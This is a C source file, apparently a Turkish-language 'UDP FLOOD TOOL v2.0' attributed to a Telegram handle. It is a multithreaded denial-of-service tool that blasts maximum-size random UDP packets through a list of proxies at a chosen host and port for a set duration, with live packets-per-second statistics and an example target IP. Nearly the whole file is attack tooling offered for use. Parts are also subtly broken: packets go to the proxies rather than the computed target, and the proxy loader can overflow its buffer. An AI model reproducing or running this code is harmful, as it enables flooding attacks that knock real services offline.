#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/time.h>

// ============================================================
// RENKLER
// ============================================================
#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define CYAN    "\033[36m"
#define WHITE   "\033[37m"
#define RESET   "\033[0m"

// ============================================================
// YAPILAR
// ============================================================
typedef struct {
    char ip[16];
    int port;
} Proxy;

typedef struct {
    char target_ip[16];
    int target_port;
    int thread_count;
    int duration;
    int running;
    long long packet_count;
    pthread_mutex_t lock;
    time_t start_time;
    Proxy *proxies;
    int proxy_count;
} AttackArgs;

// ============================================================
// FONKSİYON PROTOTİPLERİ
// ============================================================
void random_payload(unsigned char *buf, int size);
int load_proxies(const char *filename, Proxy **proxies);
void logo();
void *udp_flood_thread(void *arg);
void *timer_thread(void *arg);
void *stats_thread(void *arg);
void help();

// ============================================================
// PROXY YÜKLE
// ============================================================
int load_proxies(const char *filename, Proxy **proxies) {
    FILE *file = fopen(filename, "r");
    if (!file) return 0;
    
    int count = 0;
    char line[32];
    Proxy *list = malloc(sizeof(Proxy) * 1000);
    
    while (fgets(line, sizeof(line), file)) {
        line[strcspn(line, "\n")] = 0;
        char *colon = strchr(line, ':');
        if (colon) {
            *colon = '\0';
            strcpy(list[count].ip, line);
            list[count].port = atoi(colon + 1);
            count++;
        }
    }
    fclose(file);
    *proxies = list;
    return count;
}

// ============================================================
// LOGO
// ============================================================
void logo() {
    system("clear");
    printf(RED "\n");
    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║         UDP FLOOD TOOL v2.0 - PROXY DESTEKLİ          ║\n");
    printf("║         Telegram: @Zeldyy_here                          ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n");
    printf(RESET);
}

// ============================================================
// RASTGELE PAYLOAD
// ============================================================
void random_payload(unsigned char *buf, int size) {
    for (int i = 0; i < size; i++) {
        buf[i] = rand() % 256;
    }
}

// ============================================================
// UDP FLOOD THREAD (PROXY İLE)
// ============================================================
void *udp_flood_thread(void *arg) {
    AttackArgs *args = (AttackArgs*)arg;
    int sockfd;
    struct sockaddr_in target_addr, proxy_addr;
    unsigned char payload[65500];
    int payload_size = 65500;
    
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        return NULL;
    }
    
    int sndbuf = 2 * 1024 * 1024;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    
    // Hedef adres
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->target_port);
    inet_pton(AF_INET, args->target_ip, &target_addr.sin_addr);
    
    while (args->running) {
        // Rastgele proxy seç
        int idx = rand() % args->proxy_count;
        Proxy *p = &args->proxies[idx];
        
        // Proxy üzerinden gönder
        memset(&proxy_addr, 0, sizeof(proxy_addr));
        proxy_addr.sin_family = AF_INET;
        proxy_addr.sin_port = htons(p->port);
        inet_pton(AF_INET, p->ip, &proxy_addr.sin_addr);
        
        // Paketi proxy'ye gönder (UDP forward)
        random_payload(payload, payload_size);
        sendto(sockfd, payload, payload_size, 0, (struct sockaddr*)&proxy_addr, sizeof(proxy_addr));
        
        pthread_mutex_lock(&args->lock);
        args->packet_count++;
        pthread_mutex_unlock(&args->lock);
    }
    
    close(sockfd);
    return NULL;
}

// ============================================================
// ZAMANLAYICI
// ============================================================
void *timer_thread(void *arg) {
    AttackArgs *args = (AttackArgs*)arg;
    sleep(args->duration);
    args->running = 0;
    printf(YELLOW "\n[!] Süre doldu.\n" RESET);
    return NULL;
}

// ============================================================
// İSTATİSTİK
// ============================================================
void *stats_thread(void *arg) {
    AttackArgs *args = (AttackArgs*)arg;
    while (args->running) {
        sleep(5);
        time_t now = time(NULL);
        double elapsed = difftime(now, args->start_time);
        double pps = args->packet_count / elapsed;
        printf(CYAN "[+] %lld paket | PPS: %.0f | %.0fs\n" RESET, args->packet_count, pps, elapsed);
    }
    return NULL;
}

// ============================================================
// YARDIM
// ============================================================
void help() {
    printf(YELLOW "\nKullanım: ./udp <hedef> <port> <thread> <süre>\n");
    printf("Örnek: ./udp 193.31.7.11 53 500 60\n");
    printf("Proxy dosyası: proxies.txt (ip:port formatında)\n" RESET);
}

// ============================================================
// ANA
// ============================================================
int main(int argc, char *argv[]) {
    srand(time(NULL));
    logo();
    
    if (argc < 5) {
        help();
        exit(1);
    }
    
    AttackArgs args;
    strcpy(args.target_ip, argv[1]);
    args.target_port = atoi(argv[2]);
    args.thread_count = atoi(argv[3]);
    args.duration = atoi(argv[4]);
    args.running = 1;
    args.packet_count = 0;
    args.start_time = time(NULL);
    pthread_mutex_init(&args.lock, NULL);
    
    // Proxy yükle
    args.proxy_count = load_proxies("proxies.txt", &args.proxies);
    if (args.proxy_count == 0) {
        printf(RED "[!] Proxy bulunamadı! proxies.txt dosyası oluştur.\n" RESET);
        exit(1);
    }
    
    printf(GREEN "\n[ Attack Info ]\n");
    printf(CYAN "Status    Sent successfully!\n");
    printf(WHITE "Host      %s\n", args.target_ip);
    printf(WHITE "Port      %d\n", args.target_port);
    printf(WHITE "Threads   %d\n", args.thread_count);
    printf(WHITE "Proxy     %d adet yüklendi\n", args.proxy_count);
    printf(RED "\n[+] Saldırı başladı! CTRL+C durdur.\n" RESET);
    
    // Thread'ler
    pthread_t timer_tid, stats_tid;
    pthread_create(&timer_tid, NULL, timer_thread, &args);
    pthread_create(&stats_tid, NULL, stats_thread, &args);
    
    pthread_t *threads = malloc(args.thread_count * sizeof(pthread_t));
    for (int i = 0; i < args.thread_count; i++) {
        pthread_create(&threads[i], NULL, udp_flood_thread, &args);
    }
    
    while (args.running) sleep(1);
    
    for (int i = 0; i < args.thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    free(threads);
    free(args.proxies);
    
    printf(GREEN "\n[+] Toplam Paket: %lld\n", args.packet_count);
    return 0;
}